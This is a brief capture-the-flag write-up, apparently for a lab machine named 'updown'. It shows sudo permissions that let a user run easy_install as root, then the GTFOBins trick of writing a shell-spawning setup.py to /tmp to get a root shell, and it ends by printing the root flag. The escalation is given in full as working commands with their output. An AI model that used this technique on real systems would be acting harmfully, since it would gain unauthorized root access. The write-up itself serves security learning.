# listing sudo permission
```
developer@updown:~$ sudo -l
Matching Defaults entries for developer on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User developer may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/local/bin/easy_install
```

# exploiting the easy_install(gtfobins) and getting root flag
```
developer@updown:~$ echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > /tmp/shell.py
developer@updown:~$ sudo easy_install /tmp/
WARNING: The easy_install command is deprecated and will be removed in a future version.
Processing 
Writing /tmp/tmp.evTjunadBo/setup.cfg
Running tmp.evTjunadBo/setup.py -q bdist_egg --dist-dir /tmp/tmp.evTjunadBo/egg-dist-tmp-VTZ_9r
# cd /root
# ls -la
total 44
drwx------  6 root root 4096 Aug  1 18:09 .
drwxr-xr-x 19 root root 4096 Aug  3 16:52 ..
lrwxrwxrwx  1 root root    9 Jul 27 14:20 .bash_history -> /dev/null
-rw-r--r--  1 root root   11 Jun 22  2022 .bash_logout
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Jun 22  2022 .cache
drwxr-xr-x  3 root root 4096 Jul 27 14:04 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
-rw-r--r--  1 root root   66 Aug  1 18:09 .selected_editor
drwx------  2 root root 4096 Jun 22  2022 .ssh
-rw-r-----  1 root root   33 Jan  5 10:42 root.txt
drwx------  3 root root 4096 Jun 22  2022 snap
# cat root.txt
07e87fa97a99e07aeb5c3cc604446877
```